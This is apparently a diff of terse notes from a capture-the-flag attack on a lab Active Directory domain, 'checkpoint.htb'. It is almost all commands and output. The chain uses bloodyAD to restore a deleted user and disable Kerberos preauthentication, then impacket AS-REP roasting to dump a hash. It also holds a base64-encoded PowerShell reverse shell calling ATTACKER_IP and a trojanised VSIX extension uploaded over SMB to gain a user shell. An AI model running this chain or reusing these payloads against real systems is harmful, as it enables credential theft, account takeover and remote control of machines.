@@ -1,0 +1,49 @@
+bloodyAD --host IP -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
+permission: WRITE
+
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+permission: WRITE
+
+python3 bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
+[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
+
+ python3 bloodyAD.py --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
+add uac mark.davies -f DONT_REQ_PREAUTH
+[+] ['DONT_REQ_PREAUTH'] property flags added to mark.davies's userAccountControl
+
+ impacket-GetNPUsers checkpoint.htb/mark.davies -dc-ip IP -no-pass -format hashcat -outputfile mark.hash
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
+[*] Getting TGT for mark.davies
+$krb5asrep$18$mark.davies$CHECKPOINT.HTB$87832733c9b877369a5a3a25$981ae551dde5b4b3e60078679fe52072ade97cb69a87888f438c999634a448086bf2e3d014dfdf1016c262e993769d66acfcb4ea2ba2d2a2631817e1625bcf03159d4bc5d9842c9de463ba6062a6ba64efd288dee32c8e86370f5eb2e9ca98847ffcd91f3c922e200a69d4f618fd9c95aee4489f049167c7c2bde2d218e287816af87920b6bd8a54bdb5c72555d27d5fc866153db5e2ec762b63f7fcdad9f3609b937c451f228f3f1be2f525f9042514245622792dbf3b9615443d58328ed480ad5ac45d2670b75c682ed6ae379a7087fd274cb669a195df9a6f1ae08a44c40f3446ff7cba2198ebba68b64a92375a834f84da450370b14a
+
+rev shell - 
+
+python3 -c "
+import base64
+cmd = '\$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",9001);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'
+print(base64.b64encode(cmd.encode('utf-16-le')).decode())
+"
+
+zip -r ../dev-tools-helper.vsix [Content_Types].xml extension.vsixmanifest extension/
+
+smbclient //IP/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' \
+  -c 'put dev-tools-helper.vsix'
+
+PS C:\Users> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name              SID
+====================== ==============================================
+checkpoint\ryan.brooks S-1-5-21-3129162710-3498938529-1807524340-1103
+
+
+PS C:\Users\ryan.brooks\Desktop> type user.txt
+
+
